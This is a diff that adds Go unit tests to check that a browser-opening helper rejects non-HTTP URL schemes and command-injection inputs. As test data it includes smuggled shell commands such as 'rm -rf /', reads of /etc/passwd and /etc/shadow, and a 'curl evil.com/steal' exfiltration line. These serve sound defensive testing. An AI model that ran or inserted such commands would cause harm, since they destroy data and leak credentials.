@@ -275,4 +275,146 @@ func TestBrowserCommandIncludesUnsupportedPlatformInError(t *testing.T) {
 	}
 }
 
+func TestBrowserCommandRejectsNonHTTPSSchemes(t *testing.T) {
+	tests := []struct {
+		name string
+		url  string
+	}{
+		{"file URL", "file:///etc/passwd"},
+		{"javascript pseudo-protocol", "javascript:alert(1)"},
+		{"data URL", "data:text/html,<script>alert(1)</script>"},
+		{"ftp URL", "ftp://malicious.example.com"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			_, err := browserCommand("darwin", tt.url)
+			if err == nil {
+				t.Fatalf("expected error for %q, got nil", tt.url)
+			}
+			if !strings.Contains(err.Error(), "unsupported URL scheme") {
+				t.Fatalf("expected unsupported URL scheme error, got %q", err.Error())
+			}
+		})
+	}
+}
+
+func TestBrowserCommandRejectsShellMetacharacters(t *testing.T) {
+	tests := []string{
+		"https://foo.com; rm -rf /",
+		"http://example.com`cat /etc/passwd`",
+		"https://foo.com|cat /etc/shadow",
+		"https://foo.com\ncurl evil.com/steal",
+	}
+	for _, url := range tests {
+		t.Run(url, func(t *testing.T) {
+			_, err := browserCommand("darwin", url)
+			if err == nil {
+				t.Fatalf("expected error for %q, got nil", url)
+			}
+		})
+	}
+}
+
+func TestBrowserCommandAcceptsValidURLs(t *testing.T) {
+	tests := []string{
+		"https://foo.example.com",
+		"http://bar.example.com/path?q=1",
+		"https://example.com/path#fragment",
+		"http://localhost:8080/",
+		"https://sub.domain.example.com/path/to/page",
+	}
+	for _, url := range tests {
+		t.Run(url, func(t *testing.T) {
+			cmd, err := browserCommand("darwin", url)
+			if err != nil {
+				t.Fatalf("expected no error for %q, got %v", url, err)
+			}
+			if len(cmd.Args) < 2 {
+				t.Fatalf("expected at least 2 args, got %d", len(cmd.Args))
+			}
+			// The sanitized URL should be the last argument, not the raw input
+			lastArg := cmd.Args[len(cmd.Args)-1]
+			if lastArg != url {
+				t.Fatalf("expected sanitized URL %q as last arg, got %q", url, lastArg)
+			}
+		})
+	}
+}
+
+func TestIsBrowsableHomepageRejectsMalformedURLs(t *testing.T) {
+	tests := []struct {
+		name     string
+		homepage string
+	}{
+		{"file scheme", "file:///etc/passwd"},
+		{"javascript scheme", "javascript:alert(1)"},
+		{"data scheme", "data:text/html,<script>alert(1)</script>"},
+		{"no scheme", "(not found)"},
+		{"empty string", ""},
+		{"shell injection via semicolon", "https://foo.com; rm -rf /"},
+		{"shell injection via backtick", "http://example.com`id`"},
+		{"shell injection via pipe", "https://foo.com|cat /etc/shadow"},
+		{"newline injection", "https://foo.com\ncurl evil.com"},
+		{"ftp scheme", "ftp://evil.com"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			if isBrowsableHomepage(tt.homepage) {
+				t.Fatalf("expected false for %q, got true", tt.homepage)
+			}
+		})
+	}
+}
+
 var realOpenBrowser = openBrowser
+
+func TestIsBrowsableHomepageRejectsMaliciousURLs(t *testing.T) {
+	tests := []struct {
+		name     string
+		homepage string
+		want     bool
+	}{
+		{"valid https", "https://example.com", true},
+		{"valid http", "http://example.com", true},
+		{"javascript scheme", "javascript:alert(1)", false},
+		{"file scheme", "file:///etc/passwd", false},
+		{"data scheme", "data:text/html,<script>alert(1)</script>", false},
+		{"ftp scheme", "ftp://evil.example.com", false},
+		{"ssh scheme", "ssh://attacker.example.com", false},
+		{"empty string", "", false},
+		{"no scheme", "example.com", false},
+		{"scheme with different case", "HTTPS://example.com", true}, // url.Parse normalises scheme to lowercase per RFC 3986
+		{"scheme prefix injection", "https://evil.example.com.evil.example.com", true},
+		{"just https prefix", "https://", false}, // url.Parse yields empty Host — nothing to browse
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			got := isBrowsableHomepage(tt.homepage)
+			if got != tt.want {
+				t.Errorf("isBrowsableHomepage(%q) = %v, want %v", tt.homepage, got, tt.want)
+			}
+		})
+	}
+}
+
+func TestBrowserCommandRejectsMaliciousURLs(t *testing.T) {
+	malicious := []string{
+		"javascript:alert(1)",
+		"file:///etc/passwd",
+		"data:text/html,<script>alert(1)</script>",
+		"",
+	}
+
+	for _, url := range malicious {
+		t.Run(url, func(t *testing.T) {
+			// These should never reach browserCommand because isBrowsableHomepage
+			// filters them first. But if they do reach browserCommand on a real platform,
+			// they should be handled by the OS browser which will reject non-URL schemes.
+			// The key test is that isBrowsableHomepage returns false for these.
+			if isBrowsableHomepage(url) {
+				t.Errorf("isBrowsableHomepage(%q) should be false — this URL could be used for command injection", url)
+			}
+		})
+	}
+}
